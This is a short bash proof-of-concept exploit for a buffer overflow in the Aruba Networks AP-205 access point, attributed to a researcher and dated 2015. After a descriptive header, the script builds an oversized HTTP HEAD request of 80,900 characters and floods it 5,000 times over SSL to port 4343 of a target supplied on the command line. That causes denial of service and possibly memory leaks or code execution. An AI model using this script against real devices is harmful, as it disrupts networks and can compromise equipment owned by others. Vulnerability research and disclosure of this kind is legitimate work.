#!/bin/bash 
# Aruba Networks AP-205 Buffer Overflow Vulnerability 
# Company: Aruba Networks 
# Device Model: AP-205 
# Firmware Version: ArubaOS 6.4.2.3-4.1.1.4_49446 
# Researcher: 1N3 @ https://crowdshield.com 
# Date: 8/10/2015 
# 
# The Aruba Networks AP-205 series is prone to a remote buffer overflow 
# vulnerability because it fails to bounds-check user-supplied input 
# before copying it into an insufficiently sized memory buffer. Writing 
# outside the bounds of a block of allocated memory results in a memory 
# leak of sensitive details, denial of service and could lead to remote 
# code execution. 
#

TARGET="$1"

if [ -z $TARGET ]; then 
echo "+ -- --=[Aruba Networks AP-205 Series BoF PoC by 1N3" 
echo "+ -- --=[http://crowdshield.com" 
echo "+ -- --=[Usage: aruba_ap205_bof_poc <target>" 
echo "" 
exit 
fi

rm -f /tmp/buf 
echo "HEAD / " `perl -e 'print "1"x80900'` > /tmp/buf 
echo "Host: $TARGET" >> /tmp/buf 
echo "" >> /tmp/buf 
echo "Sending exploit..." 
# cat /tmp/buf #DEBUG ONLY

for a in {1..5000}; 
do 
cat /tmp/buf | ncat --ssl $TARGET 4343; 
done

rm -f /tmp/buf
